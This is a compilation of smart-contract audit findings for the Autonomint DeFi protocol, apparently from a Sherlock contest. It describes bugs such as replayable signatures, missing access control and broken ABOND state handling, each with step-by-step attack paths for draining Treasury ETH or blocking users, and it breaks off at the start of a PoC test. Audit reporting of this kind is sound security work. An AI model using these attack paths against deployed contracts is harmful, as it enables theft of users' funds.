# Issue H-1: After closing synthetix position we don't update global data for liquidations 

Source: https://github.com/sherlock-audit/2024-11-autonomint-judging/issues/178 

## Found by 
Audinarey, valuevalk

### Summary
After admin closes synthetix position we don't update any global variables, which means that dCDS depositors and the whole protocol cannot benefit from the liquidation and the potential gains from its shorted position. 

### Root Cause
`closeThePositionInSynthetix()` function in [borrowLiquidation.sol](https://github.com/sherlock-audit/2024-11-autonomint/blob/0d324e04d4c0ca306e1ae4d4c65f0cb9d681751b/Blockchain/Blockchian/contracts/Core_logic/borrowLiquidation.sol#L371-L375) only closes the position and does not update any global variables like in the `liquidation type 1`

```solidity
    function closeThePositionInSynthetix() external onlyBorrowingContract {
        (, uint128 ethPrice) = borrowing.getUSDValue(borrowing.assetAddress(IBorrowing.AssetName.ETH));
        // Submit an order to close all positions in synthetix
        synthetixPerpsV2.submitOffchainDelayedOrder(-synthetixPerpsV2.positions(address(this)).size, ethPrice * 1e16);
    }
```

For reference in liquidation type 1 we update many values to make the protocol aware of the fact that we have a position liquidated and its collateral is ready to be taken from dCDS depositors opted-in for that. ( other values related to yield for ABOND also shall be updated, just like in liquidation type 1 )
```solidity
      // Update the CDS data
        cds.updateLiquidationInfo(omniChainData.noOfLiquidations, liquidationInfo);
        cds.updateTotalCdsDepositedAmount(cdsAmountToGetFromThisChain);
        cds.updateTotalCdsDepositedAmountWithOptionFees(cdsAmountToGetFromThisChain);
        cds.updateTotalAvailableLiquidationAmount(cdsAmountToGetFromThisChain);
        omniChainData.collateralProfitsOfLiquidators += depositDetail.depositedAmountInETH;

        // Update the global data
        omniChainData.totalCdsDepositedAmount -= liquidationAmountNeeded - cdsProfits; //! need to revisit this
        omniChainData.totalCdsDepositedAmountWithOptionFees -= liquidationAmountNeeded - cdsProfits;
        omniChainData.totalAvailableLiquidationAmount -= liquidationAmountNeeded - cdsProfits;
        omniChainData.totalInterestFromLiquidation += uint256(borrowerDebt - depositDetail.borrowedAmount);
        omniChainData.totalVolumeOfBorrowersAmountinWei -= depositDetail.depositedAmountInETH;
        omniChainData.totalVolumeOfBorrowersAmountinUSD -= depositDetail.depositedAmountUsdValue;
        omniChainData.totalVolumeOfBorrowersAmountLiquidatedInWei += depositDetail.depositedAmountInETH;

        // Update totalInterestFromLiquidation
        uint256 totalInterestFromLiquidation = uint256(borrowerDebt - depositDetail.borrowedAmount);

        // Update individual collateral data
        --collateralData.noOfIndices;
        collateralData.totalDepositedAmount -= depositDetail.depositedAmount;
        collateralData.totalDepositedAmountInETH -= depositDetail.depositedAmountInETH;
        collateralData.totalLiquidatedAmount += depositDetail.depositedAmount;
        // Calculate the yields
        uint256 yields = depositDetail.depositedAmount - ((depositDetail.depositedAmountInETH * 1 ether) / exchangeRate);

        // Update treasury data
        treasury.updateTotalVolumeOfBorrowersAmountinWei(depositDetail.depositedAmountInETH);
        treasury.updateTotalVolumeOfBorrowersAmountinUSD(depositDetail.depositedAmountUsdValue);
        treasury.updateDepositedCollateralAmountInWei(depositDetail.assetName, depositDetail.depositedAmountInETH);
        treasury.updateDepositedCollateralAmountInUsd(depositDetail.assetName, depositDetail.depositedAmountUsdValue);
        treasury.updateTotalInterestFromLiquidation(totalInterestFromLiquidation);
        treasury.updateYieldsFromLiquidatedLrts(yields);
        treasury.updateDepositDetails(user, index, depositDetail);

        globalVariables.updateCollateralData(depositDetail.assetName, collateralData);
        globalVariables.setOmniChainData(omniChainData);
```

### Internal pre-conditions

_No response_

### External pre-conditions

_No response_

### Attack Path
- Liquidation Type 2 occurs.
- 1x short position is submitted for the liquidated collateral
- After some time and profits from the short position, admin closes it
- Global variables are not updated, which means that the collateral is unused.

### Impact
- The dCDS depositors won't be able to withdraw their portion of that liquidation, as we never registered it on the global omnichain fields.

### PoC

_No response_

### Mitigation
After closing the short position update the global variables, so the protocol can work with the collateral thats now available to be withdrawn from dCDS depositors. Other factors such as yield for abond apply as well.

# Issue H-2: Potential Underflow in `withdrawInterest` 

Source: https://github.com/sherlock-audit/2024-11-autonomint-judging/issues/228 

## Found by 
0x73696d616f, 0xAadi, Audinarey, AuditorPraise, Aymen0909, Cybrid, Galturok, PeterSR, Ragnarok, RampageAudit, Waydou, nuthan2x, onthehunt, super\_jack, volodya

### Summary

In the `withdrawInterest` function, if `totalInterest` is less than `amount`, subtracting `amount` from `totalInterest` will cause an underflow and revert the transaction due to Solidity 0.8.x's checked arithmetic, even if `totalInterestFromLiquidation` has sufficient balance to cover the withdrawal.

### Root Cause

The function checks the combined balance but only subtracts from `totalInterest`:

https://github.com/sherlock-audit/2024-11-autonomint/blob/0d324e04d4c0ca306e1ae4d4c65f0cb9d681751b/Blockchain/Blockchian/contracts/Core_logic/Treasury.sol#L616C1-L625C6

```solidity
require(amount <= (totalInterest + totalInterestFromLiquidation), "Treasury don't have enough interest");
totalInterest -= amount;
```

If `totalInterest < amount`, this subtraction underflows and reverts.

### Internal pre-conditions

none

### External pre-conditions

none

### Attack Path

_No response_

### Impact

DOS, underflow and revert.

### PoC

1. Set `totalInterest` to 50 and `totalInterestFromLiquidation` to 100.
2. Attempt to withdraw an `amount` of 75.
3. The `require` passes because 75 ≤ 150.
4. Subtracting 75 from `totalInterest` (50) causes an underflow and reverts.

### Mitigation

Implement logic to deduct the `amount` from `totalInterest` and `totalInterestFromLiquidation` proportionally or sequentially:

```solidity
if (amount <= totalInterest) {
    totalInterest -= amount;
} else {
    uint256 remaining = amount - totalInterest;
    totalInterest = 0;
    totalInterestFromLiquidation -= remaining;
}
```

# Issue H-3: `Borrowing::redeemYields` debits `ABOND` from `msg.sender` but redeems to `user` using `ABOND.State` data from `user` 

Source: https://github.com/sherlock-audit/2024-11-autonomint-judging/issues/271 

## Found by 
0x73696d616f, RampageAudit, kenzo123, santiellena, super\_jack, t.aksoy, tjonair, volodya

### Summary

`Borrowing::redeemYields` debits `ABOND` from `msg.sender` (which updates its state), but uses the information of the `user` passed to calculate the amount to be withdrawn from the external protocol to send to the `user`. This allows an attacker to have one address with `ABOND` recently purchased (`msg.sender`), redeem yield to `user` using `user` `ABOND.State` data (`ethBacked` and `cumulativeRate`). As the debit occurs to `msg.sender` address, the attacker can repeatedly buy `ABOND` in an external market and redeem yields from `user` without debiting from `user`.

### Root Cause

The `Borrowing::redeemYields` function, receives as parameters `address user, uint128 aBondAmount` and calls the `BorrowLib::redeemYields` function:

First, the function incorrectly checks if the `user` has enough `ABOND` balance when it should check if `msg.sender` enough balance:
[BorrowLib.sol#L990-L992](https://github.com/sherlock-audit/2024-11-autonomint/blob/0d324e04d4c0ca306e1ae4d4c65f0cb9d681751b/Blockchain/Blockchian/contracts/lib/BorrowLib.sol#L990-L992)
```solidity
State memory userState = abond.userStates(user);
// check user have enough abond
if (aBondAmount > userState.aBondBalance) revert IBorrowing.Borrow_InsufficientBalance();
```

Then, it calculates the amount of `USDa` that has to burn, and the amount to send to `user` for the liquidation earnings of the protocol.

Finally, the `Treasury::withdrawFromExternalProtocol` function is called with `user` and `abondAmount` as parameters:
[BorrowLib.sol#L1028-L1029](https://github.com/sherlock-audit/2024-11-autonomint/blob/0d324e04d4c0ca306e1ae4d4c65f0cb9d681751b/Blockchain/Blockchian/contracts/lib/BorrowLib.sol#L1028-L1029)
```solidity
// withdraw eth from ext protocol
uint256 withdrawAmount = treasury.withdrawFromExternalProtocol(user,aBondAmount);
```

Going through the `Treasury::withdrawFromExternalProtocol`:
[Treasury.sol#L283-L296](https://github.com/sherlock-audit/2024-11-autonomint/blob/0d324e04d4c0ca306e1ae4d4c65f0cb9d681751b/Blockchain/Blockchian/contracts/Core_logic/Treasury.sol#L283-L296)
```solidity
    function withdrawFromExternalProtocol(
        address user,
        uint128 aBondAmount
    ) external onlyCoreContracts returns (uint256) {
        if (user == address(0)) revert Treasury_ZeroAddress();
        
        // Withdraw from external protocols
        uint256 redeemAmount = withdrawFromIonicByUser(user, aBondAmount);
        // Send the ETH to user
        (bool sent, ) = payable(user).call{value: redeemAmount}("");
        // check the transfer is successfull or not
        require(sent, "Failed to send Ether");
        return redeemAmount;
    }
```

The `redeemAmount` of ETH got in `Treasury::withdrawFromIonicByUser` is sent to the `user`:
[Treasury.sol#L703-L724](https://github.com/sherlock-audit/2024-11-autonomint/blob/0d324e04d4c0ca306e1ae4d4c65f0cb9d681751b/Blockchain/Blockchian/contracts/Core_logic/Treasury.sol#L703-L724)
```solidity
    function withdrawFromIonicByUser(
        address user,
        uint128 aBondAmount
    ) internal nonReentrant returns (uint256) {
        uint256 currentExchangeRate = ionic.exchangeRateCurrent();
        uint256 currentCumulativeRate = _calculateCumulativeRate(currentExchangeRate, Protocol.Ionic);
        
        State memory userState = abond.userStates(user);
        uint128 depositedAmount = (aBondAmount * userState.ethBacked) / PRECISION;
        uint256 normalizedAmount = (depositedAmount * CUMULATIVE_PRECISION) / userState.cumulativeRate;
        
        //withdraw amount
        uint256 amount = (currentCumulativeRate * normalizedAmount) / CUMULATIVE_PRECISION;
        // withdraw from ionic
        ionic.redeemUnderlying(amount);
        
        protocolDeposit[Protocol.Ionic].totalCreditedTokens = ionic.balanceOf(address(this));
        protocolDeposit[Protocol.Ionic].exchangeRate = currentExchangeRate;
        // convert weth to eth
        WETH.withdraw(amount);
        return amount;
    }
```

As it can be seen, the `amont` is calculated with `userState` data of the user. That data is stored in the `ABOND` contract. After this redeem, the `ethBacked` of the user should be zero because it is withdraw.

However, the account that gets its `ABOND` debited and thus its `ethBacked` and `cumulativeRate` data set to zero is the `msg.sender`, and not the `user`.
[BorrowLib.sol#L1032](https://github.com/sherlock-audit/2024-11-autonomint/blob/0d324e04d4c0ca306e1ae4d4c65f0cb9d681751b/Blockchain/Blockchian/contracts/lib/BorrowLib.sol#L1032)
```solidity
bool success = abond.burnFromUser(msg.sender, aBondAmount);
```

[Abond_Token.sol#L172-L184](https://github.com/sherlock-audit/2024-11-autonomint/blob/0d324e04d4c0ca306e1ae4d4c65f0cb9d681751b/Blockchain/Blockchian/contracts/Token/Abond_Token.sol#L172-L184)
```solidity
    function burnFromUser(
        address to,
        uint256 amount
    ) public onlyBorrowingContract returns (bool) {
        //get the state
        State memory state = userStates[to];
        // update the state
        state = Colors._debit(state, uint128(amount));
        userStates[to] = state;
        // burn abond
        burnFrom(to, amount);
        return true;
    }
```

[Colors.sol#L41-L60](https://github.com/sherlock-audit/2024-11-autonomint/blob/0d324e04d4c0ca306e1ae4d4c65f0cb9d681751b/Blockchain/Blockchian/contracts/lib/Colors.sol#L41-L60)
```solidity
    function _debit(
        State memory _fromState,
        uint128 _amount
    ) internal pure returns(State memory) {
    
        uint128 balance = _fromState.aBondBalance;
        
        // check user has sufficient balance
        require(balance >= _amount,"InsufficientBalance");
        
        // update user abond balance
        _fromState.aBondBalance = balance - _amount;
        
        // after debit, if abond balance is zero, update cr and eth backed as 0
        if(_fromState.aBondBalance == 0){
            _fromState.cumulativeRate = 0;
            _fromState.ethBacked = 0;
        }
        return _fromState;
    }
```

As can be seen, the address that gets its state modified is `msg.sender` and not `user`.

### Internal pre-conditions

The following conditions are not a restriction, with just time and funds it can be done.
- An old position of `ABOND` with `ethBacked`.
- Another account owning some `ABOND` (acquired in the protocol or purchased in an external market).

### External pre-conditions

None

### Attack Path

- The attacker deposits a big amount of ETH in the `Borrowing` contract.
- The attacker withdraws that deposit receiving `ABOND` (which is backed by ETH deposited in another protocol)
- The attacker wait until the `cumulativeRate` is significant.
- The attacker purchases with another address some `ABOND`
- The attacker calls `Borrowing::redeemYields` with the `user` parameter set as the first address that deposited in step 1.

### Impact

-  The ETH deposited in the external protocol that backs `ABOND` can be completely drained.
- `ABOND` value will fall to zero as there won't be ETH to redeem it for.

### PoC

None

### Mitigation

Enforce `msg.sender` to be equal to `user`.

# Issue H-4: odosAssembledData can be manipulated 

Source: https://github.com/sherlock-audit/2024-11-autonomint-judging/issues/345 

## Found by 
0x37, 0x73696d616f, 0xNirix, Laksmana, tjonair, volodya

### Summary

The signature in withDraw can be reused and this will cause users can choose one improper odosAssembledData and convert less collateral than expected.

### Root Cause

In [borrowing.sol:withDraw](https://github.com/sherlock-audit/2024-11-autonomint/blob/main/Blockchain/Blockchian/contracts/Core_logic/borrowing.sol#L281), borrowers can withdraw their collateral. If the current Ether price is larger than deposited Ether price, borrowers will not withdraw all collaterals. There will be some remaining collateral. These remaining collaterals will be swapped to USDT via odos router.

In one normal scenario, the protocol backend server will generate odos assembled data got from odos api, and sign the signature. The borrower will use this signed signature and `odosAssembledData` to trigger this `withDraw` function.

But the problem is that malicious users can choose one improper `odosAssembledData` and signature. Although we can not manipulate the `odosAssembledData` to any value we want, the backend servers will generate all kinds of `odosAssembledData` for different borrower's withdrawal. The malicious borrower can choose any `odosAssembledData` from all of these `odosAssembledData`.

For example:
1. Alice deposits WrsETH via depositTokens.
2. The Ether price increases, Alice wants to withdraw her collateral. Her borrow position's remaining collateral is 0.05 ether. Normally, Alice's `odosAssembledData` will swap 0.05 ether wrsETH to USDT. But Alice searches the valid used `odosAssembledData`, and find one `odosAssembledData` which input token amt is 0.01 ether. Alice uses used `odosAssembledData` to trigger her withdraw.
3. We will swap 0.01 ether wrsETH to USDT. This will cause some wrsETH locked in the contract.

```solidity
    function _withdraw(
        address toAddress,
        uint64 index,
        bytes memory odosAssembledData,
        uint64 ethPrice, // current ether price
        uint128 exchangeRate,
        uint64 withdrawTime
    ) internal {
    ...
        uint256 amountToSwap = result.collateralRemainingInWithdraw -
            collateralRemainingInWithdraw;
        if (amountToSwap > 0) {
            amountToSwap = (amountToSwap * 1 ether) / exchangeRate;
            treasury.swapCollateralForUSDT(depositDetail.assetName, amountToSwap, odosAssembledData);
        }
    ...    
}
```

### Internal pre-conditions

N/A

### External pre-conditions

N/A

### Attack Path

1. Alice deposits WrsETH via depositTokens.
2. The Ether price increases, Alice wants to withdraw her collateral. Her borrow position's remaining collateral is 0.05 ether. Normally, Alice's `odosAssembledData` will swap 0.05 ether wrsETH to USDT. But Alice searches the valid used `odosAssembledData`, and find one `odosAssembledData` which input token amt is 0.01 ether. Alice uses used `odosAssembledData` to trigger her withdraw.
3. We will swap 0.01 ether wrsETH to USDT. This will cause some wrsETH locked in the contract.

### Impact

When we swap the remaining collateral to USDT, we may swap only one part of remaining collateral to USDT. This will break our intent. Some remaining collateral will be locked in the contract, and the output USDT is less than expected.

### PoC

N/A

### Mitigation

`odosAssembledData` and `signature` should only be valid for one borrower's specific borrowing index.

# Issue H-5: cds owners can withdraw more than expected via manipulating excessProfitCumulativeValue 

Source: https://github.com/sherlock-audit/2024-11-autonomint-judging/issues/469 

## Found by 
0x37, 0x73696d616f, 0xAristos, Galturok, John44, Kral01, Laksmana, PeterSR, RampageAudit, Ruhum, Waydou, ZanyBonzy, newspacexyz, pashap9990, super\_jack, t.aksoy, theweb3mechanic, tjonair, valuevalk, volodya

### Summary

`excessProfitCumulativeValue` in withdraw() can be manipulated. Malicious users can manipulate this `excessProfitCumulativeValue` to withdraw more than expected.

### Root Cause

In [CDS.sol:withdraw](https://github.com/sherlock-audit/2024-11-autonomint/blob/main/Blockchain/Blockchian/contracts/Core_logic/CDS.sol#L279), cds owners can withdraw their usda deposit.

In withdraw(), there is one parameter `excessProfitCumulativeValue`, we will use this parameter `excessProfitCumulativeValue` to calculate the cds owner's possible profit. Although this parameter `excessProfitCumulativeValue` is signed by the admin, the signature and `excessProfitCumulativeValue` can be replayed. When different cds owners withdraw, they will get the different `excessProfitCumulativeValue` and `signature` from the protocol's backend server. Malicious users can choose any valid `excessProfitCumulativeValue`, `nonce` and `signature` from on-chain data.

Malicious users can choose one smaller `excessProfitCumulativeValue` to trigger withdraw() function. Malicious users can get more profit than expected.

```solidity
    function withdraw(
        uint64 index, // deposit index.
        uint256 excessProfitCumulativeValue,
        uint256 nonce,
        bytes memory signature
    ) external payable nonReentrant whenNotPaused(IMultiSign.Functions(5)) {
        if (!_verify(FunctionName.CDS_WITHDRAW, excessProfitCumulativeValue, nonce, "0x", signature)) revert CDS_NotAnAdminTwo();
```
```solidity
    function cdsAmountToReturn(
        address _user,
        uint64 index,
        uint128 cumulativeValue,
        bool cumulativeValueSign,
        uint256 excessProfitCumulativeValue
    ) private view returns (uint256) {
    ...
                    uint256 profit = (depositedAmount * (valDiff - excessProfitCumulativeValue)) / 1e11;
    ...
}
```

### Internal pre-conditions

N/A

### External pre-conditions

N/A

### Attack Path

N/A

### Impact

Malicious users can withdraw more profit than expected via manipulating the `excessProfitCumulativeValue` and `signauture`.

### PoC

N/A

### Mitigation

Enhance the signature check. One signature can only be used for one cds owner's specific deposit index.

# Issue H-6: Lack of lastEthPrice sync between different chains 

Source: https://github.com/sherlock-audit/2024-11-autonomint-judging/issues/533 

## Found by 
0x37, valuevalk

### Summary

The missing sync of lastEthPrice will cause incorrect cds cumulative value calculation.

### Root Cause

When users deposit or withdraw in cds, we will timely [update the cds cumulative value](https://github.com/sherlock-audit/2024-11-autonomint/blob/main/Blockchain/Blockchian/contracts/lib/CDSLib.sol#L489-L502).

We will calculate the cds gain/loss according to the ether price change from lastEthPrice to current Ether price. We will update the lastEthPrice after our calculation.

The problem is that the cds gain/loss stands for the total cds deposit's gain or loss including Op chain and Mode chain. We just update the `lastEthPrice` variable in current chain and don't sync with the other chain. When users deposit/withdraw in the other chain and calculate the cds gain/loss accroding to the ether price change, we will re-calculate the previous gain/loss because of the un-synced lastEthPrice.

For example:
1. Alice deposits in OP Chain in timestamp X. `lastEthPrice` = 3500 USD.
2. Bob deposits in Mode Chain in timestamp X. `lastEthPrice` = 3500 USD.
3. Cathy deposits in OP chain in timestamp X + 100, current Ether price = 4000 USD. We will calculate the cds gain/loss bettwne timestamp X and timestamp X + 100. The gain/loss will be updated to global variable `omniChainData.cumulativeValue` and `omniChainData.cumulativeValueSign`. `lastEthPrice` in OP Chain is updated to 4000 USD.
4. Dean deposits in Mode Chain in timestamp X + 200, current Ether price = 4000 USD. When we calculate the cds gain/loss, we will calculate the gain/loss from 3500 USD to 4000 USD because the `lastEthPrice` is still 3500 USD. This will cause the gain/loss will be calculated repeatedly.
  
```solidity
    function calculateCumulativeValue(
        uint128 _price, // current ether price
        uint256 totalCdsDepositedAmount, // usda amount in the treasury
        uint128 lastEthPrice, // last ether price
        uint256 vaultBal // collateral ether amount
    ) public pure returns (CDSInterface.CalculateValueResult memory) {
            if (_price > lastEthPrice) {
                priceDiff = _price - lastEthPrice;
                gains = true;
            } else {
                priceDiff = lastEthPrice - _price;
                gains = false;
            }
            value = uint128((_amount * vaultBal * priceDiff * 1e6) / (PRECISION * totalCdsDepositedAmount));
}

```
```solidity
        if (ethPrice != lastEthPrice) {
            updateLastEthPrice(ethPrice);
        }
```

### Internal pre-conditions

N/A

### External pre-conditions

N/A

### Attack Path

1. Alice deposits in OP Chain in timestamp X. `lastEthPrice` = 3500 USD.
2. Bob deposits in Mode Chain in timestamp X. `lastEthPrice` = 3500 USD.
3. Cathy deposits in OP chain in timestamp X + 100, current Ether price = 4000 USD. We will calculate the cds gain/loss bettwne timestamp X and timestamp X + 100. The gain/loss will be updated to global variable `omniChainData.cumulativeValue` and `omniChainData.cumulativeValueSign`. `lastEthPrice` in OP Chain is updated to 4000 USD.
4. Dean deposits in Mode Chain in timestamp X + 200, current Ether price = 4000 USD. When we calculate the cds gain/loss, we will calculate the gain/loss from 3500 USD to 4000 USD because the `lastEthPrice` is still 3500 USD. This will cause the gain/loss will be calculated repeatedly.
  

### Impact

The cds cumulative value calculation will be incorrect. This will cause cds owner's withdraw amount will be incorrect, more or less than expected.

### PoC

N/A

### Mitigation

Sync the `lastEthPrice` with the other chain.

# Issue H-7: Incorrect deducted cds deposit amount in withdrawUser 

Source: https://github.com/sherlock-audit/2024-11-autonomint-judging/issues/563 

## Found by 
0x37, valuevalk

### Summary

The calculation for `totalCdsDepositedAmount` in withdrawUser() is incorrect when the cds owners opt in liquidations. This will impact all calculations which are related with `omniChainData.totalCdsDepositedAmount`.

### Root Cause

When cds owners want to withdraw positions, we will try to deduct this position's cds deposit from the `omniChainData.totalCdsDepositedAmount`. If this cds deposit position is opt in the liquidation, one part of cds deposit has already been used in the liquidation process. So when cds owners want to withdraw, we should [deduct the left deposited amount](https://github.com/sherlock-audit/2024-11-autonomint/blob/main/Blockchain/Blockchian/contracts/lib/CDSLib.sol#L728-L729 from `omniChainData.totalCdsDepositedAmount`.

The problem is that when we update `totalCdsDepositedAmount`, we calculate via `params.cdsDepositDetails.depositedAmount - params.cdsDepositDetails.liquidationAmount`. We should notice that `params.cdsDepositDetails.liquidationAmount` is not the used liquidation amount from the cds owner. It stands for left liquidation amount for this position.

We should deduct the left deposit amount: `depositedAmount - (initialLiquidationAmount - liquidationAmount)`
```solidity
    function withdrawUser(
        CDSInterface.WithdrawUserParams memory params,
        CDSInterface.Interfaces memory interfaces,
        uint256 totalCdsDepositedAmount,
        uint256 totalCdsDepositedAmountWithOptionFees,
        mapping(uint128 liquidationIndex => CDSInterface.LiquidationInfo)
            storage omniChainCDSLiqIndexToInfo
    ) public returns (CDSInterface.WithdrawResult memory) {
          CDSInterface.LiquidationInfo memory liquidationData = omniChainCDSLiqIndexToInfo[i];
          uint128 share = (liquidationAmount * 1e10) / uint128(liquidationData.availableLiquidationAmount);
          params.cdsDepositDetails.liquidationAmount -= getUserShare(liquidationData.liquidationAmount, share);
}
```
```solidity
      totalCdsDepositedAmount -= (params.cdsDepositDetails.depositedAmount - params.cdsDepositDetails.liquidationAmount);
      params.omniChainData.totalCdsDepositedAmount -= (params.cdsDepositDetails.depositedAmount - params.cdsDepositDetails.liquidationAmount);

```

### Internal pre-conditions

N/A

### External pre-conditions

N/A

### Attack Path

N/A

### Impact

`omniChainData.totalCdsDepositedAmount` will be updated incorrectly. This will cause incorrect cds cumulative value's calculation. 
Cds owners may get the incorrect return value.

### PoC

N/A

### Mitigation

```solidity
totalCdsDepositedAmount -= depositedAmount - (initialLiquidationAmount - liquidationAmount);
```

# Issue H-8: Malicious users can DOS the protocol by setting downsideProtected to a large value 

Source: https://github.com/sherlock-audit/2024-11-autonomint-judging/issues/624 

## Found by 
0x23r0, 0x37, 0x73696d616f, 0xAadi, 0xAristos, 0xCNX, 0xNirix, 0xTamayo, 0xloophole, 0xmujahid002, 0xnegan, Abhan1041, Aymen0909, Cybrid, EmreAy24, John44, KungFuPanda, LordAlive, OlaHamid, OrangeSantra, ParthMandale, PeterSR, RampageAudit, Silvermist, akhoronko, aycozyOx, befree3x, dimah7, durov, fat32, futureHack, internetcriminal, itcruiser00, jah, joshuajee, kenzo123, moray5554, newspacexyz, nuthan2x, onthehunt, smbv-1923, super\_jack, t.aksoy, theweb3mechanic, vatsal, volodya, wellbyt3, xKeywordx

### Summary

In CDS.sol updateDownsideProtected() has no access control so malicious users can set downsideProtected to a large value which will DOS the system.

### Root Cause

Because updateDownsideProtected() has no access control malicious users can manipulate the downsideProtected variable which is used in core functions of CDS.sol, causing DOS.
```solidity
    function updateDownsideProtected(uint128 downsideProtectedAmount) external {
        downsideProtected += downsideProtectedAmount;
    }
```
https://github.com/sherlock-audit/2024-11-autonomint/blob/main/Blockchain/Blockchian/contracts/Core_logic/CDS.sol#L829-L831
```solidity
    function _updateCurrentTotalCdsDepositedAmount() private {
        if (downsideProtected > 0) {
            totalCdsDepositedAmount -= downsideProtected;
            totalCdsDepositedAmountWithOptionFees -= downsideProtected;
            downsideProtected = 0;
        }
    }
```
https://github.com/sherlock-audit/2024-11-autonomint/blob/main/Blockchain/Blockchian/contracts/Core_logic/CDS.sol#L833-L839
`_updateCurrentTotalCdsDepositedAmount()` is used in functions like deposit() and withdraw() so a revert here will DOS users from depositing and withdrawing.

### Internal pre-conditions

_No response_

### External pre-conditions

_No response_

### Attack Path

1. Malicious user sets downsideProtected to a large value (greater than totalCdsDepositedAmount)
2. Users calling deposit() or withdraw() will be DOS'ed because a revert will happen in `_updateCurrentTotalCdsDepositedAmount()` due to underflow.

### Impact

Users are DOS'ed from interacting with the protocol so those who deposited have their assets frozen in the contract.

### PoC

_No response_

### Mitigation

Implement access control to updateDownsideProtected()

# Issue H-9: `ABONDToken::transferFrom` does not work as intended and allows theft of ETH funds from `Treasury` 

Source: https://github.com/sherlock-audit/2024-11-autonomint-judging/issues/636 

## Found by 
0xAadi, 0xAristos, KungFuPanda, PNS, Waydou, durov, montecristo, santiellena, theweb3mechanic, tjonair, valuevalk

### Summary

The `ABONDToken::transferFrom` function suffers from a logical issue where the `fromState` post `Colors::_debit` is updated to the `msg.sender` and not to the `from` address. This not only breaks the accounting of the `ABONDToken` and the expected functionality of an `ERC20` token but also allows an attacker to drain ETH `Treasury` funds through the `Borrowing::redeemYields` function.

### Root Cause

In the `ABONDToken::transferFrom` function, after the `fromState` of the `from` address gets debited, it is assigned to the `msg.sender` state:
[Abond_Token.sol#L147-L170](https://github.com/sherlock-audit/2024-11-autonomint/blob/0d324e04d4c0ca306e1ae4d4c65f0cb9d681751b/Blockchain/Blockchian/contracts/Token/Abond_Token.sol#L147-L170)
```solidity
    function transferFrom(
        address from,
        address to,
        uint256 value
    ) public override returns (bool) {
        // check the input params are non zero
        require(from != address(0) && to != address(0), "Invalid User");
        
        // get the sender and receiver state
        State memory fromState = userStates[from];
        State memory toState = userStates[to];
        
        // update receiver state
        toState = Colors._credit(fromState, toState, uint128(value));
        userStates[to] = toState;
        
        // update sender state
        fromState = Colors._debit(fromState, uint128(value));
        userStates[msg.sender] = fromState;
        
        // transfer abond
        super.transferFrom(from, to, value);
        return true;
    }
```

This creates a problem when making a valid call to `transferFrom`. When somebody (or a protocol) wants to transfer from a user the approved `ABOND` to use it, the `ERC20` balance it will get will be the expected, however, the `userState` of the `msg.sender` will be the state of the `from` address right after it got the `value` amount debited in `Colors::_debit`.

Additionally, an attacker could use it to duplicate `userStates` to call `Borrowing::redeemYields` with an inflated `ethBacked` amount and a lower `cumulativeRate` that couldn't get in a valid way.

See the `Borrowing::redeemYields` flow and how the `userState` information is used to calculate how much ETH will be redeemed:
[borrowing.sol#L318-L333](https://github.com/sherlock-audit/2024-11-autonomint/blob/0d324e04d4c0ca306e1ae4d4c65f0cb9d681751b/Blockchain/Blockchian/contracts/Core_logic/borrowing.sol#L318-L333)
```solidity
    function redeemYields(
        address user,
        uint128 aBondAmount
    ) public returns (uint256) {
        // Call redeemYields function in Borrow Library
        return (
            BorrowLib.redeemYields(
                user,
                aBondAmount,
                address(usda),
                address(abond),
                address(treasury),
                address(this)
            )
        );
    }
```

The `Treasury::withdrawFromExternalProtocol` function has an external call to the `user` address to send the ETH calculated in `Treasury::withdrawFromIonicByUser`:
[Treasury.sol#L283-L296](https://github.com/sherlock-audit/2024-11-autonomint/blob/0d324e04d4c0ca306e1ae4d4c65f0cb9d681751b/Blockchain/Blockchian/contracts/Core_logic/Treasury.sol#L283-L296)
```solidity
    function withdrawFromExternalProtocol(
        address user,
        uint128 aBondAmount
    ) external onlyCoreContracts returns (uint256) {
        if (user == address(0)) revert Treasury_ZeroAddress();
        
        // Withdraw from external protocols
        uint256 redeemAmount = withdrawFromIonicByUser(user, aBondAmount);
        // Send the ETH to user
        (bool sent, ) = payable(user).call{value: redeemAmount}(""); // EXTERNAL CALL
        // check the transfer is successfull or not
        require(sent, "Failed to send Ether");
        return redeemAmount;
    }
```

Here it can be seen that the `amount` to be withdrawn is calculated using `ABONDToken::userStates` information:
[Treasury.sol#L703-L724](https://github.com/sherlock-audit/2024-11-autonomint/blob/0d324e04d4c0ca306e1ae4d4c65f0cb9d681751b/Blockchain/Blockchian/contracts/Core_logic/Treasury.sol#L703-L724)
```solidity
    function withdrawFromIonicByUser(
        address user,
        uint128 aBondAmount
    ) internal nonReentrant returns (uint256) {
        uint256 currentExchangeRate = ionic.exchangeRateCurrent();
        uint256 currentCumulativeRate = _calculateCumulativeRate(currentExchangeRate, Protocol.Ionic);
        
        State memory userState = abond.userStates(user); // @audit user states data
        uint128 depositedAmount = (aBondAmount * userState.ethBacked) / PRECISION;
        uint256 normalizedAmount = (depositedAmount * CUMULATIVE_PRECISION) / userState.cumulativeRate;
        
        //withdraw amount
        uint256 amount = (currentCumulativeRate * normalizedAmount) / CUMULATIVE_PRECISION;
        // withdraw from ionic
        ionic.redeemUnderlying(amount);
        
        protocolDeposit[Protocol.Ionic].totalCreditedTokens = ionic.balanceOf(address(this));
        protocolDeposit[Protocol.Ionic].exchangeRate = currentExchangeRate;
        // convert weth to eth
        WETH.withdraw(amount);
        return amount;
    }
```

It is needed that the `aBondAmount` parameter passed in `Borrowing::redeemYields` is at most the amount that `ABONDToken::balanceOf` returns and not the `abondBalance` in `ABONDToken::userStates` because when burning both amounts will face deductions (When debiting the user state and when the `ERC20` `burnFrom` function is called).

### Internal pre-conditions

For the logical issue: none.

For the theft of ETH from `Treasury`:
- One account that holds a big amount of `ABOND` (N°1)
- Other account that has less `ABOND` (N°2).

### External pre-conditions

Noen

### Attack Path

- Attacker approves account 2 to spend some amount of account 1.
- Attacker transfers a small amount of `ABOND` from account 1, to account 3 calling `transferFrom` with account 2.
- Now that the `userState` of account 1 is duplicated in account 2, the attacker calls `Borrowing::redeemYields` with the account 2 with the `aBondAmount` parameter as the balance of account 2, but when withdrawing from the external protocol, it will use the duplicate `userState` of account 2 which now is a quasi-duplicated of `userState` of account. In addition, the `userState` of account 1 will not debit the `value` amount and the attacker will be able to call `Borrowing::redeemYields` with the two accounts to withdraw twice as much as expected.

### Impact

- Breaking of accounting in `ABONDToken` `userStates`.
- Non-compliance with EIP-20.
- Theft of ETH funds from `Treasury`

### PoC

Add the following PoC to `test/foundry/Borrowing.t.sol`:

```solidity
function test_PoC_TransferFromBroken() public {
        uint256 ETH = 1;
        uint24 ethPrice = 388345;
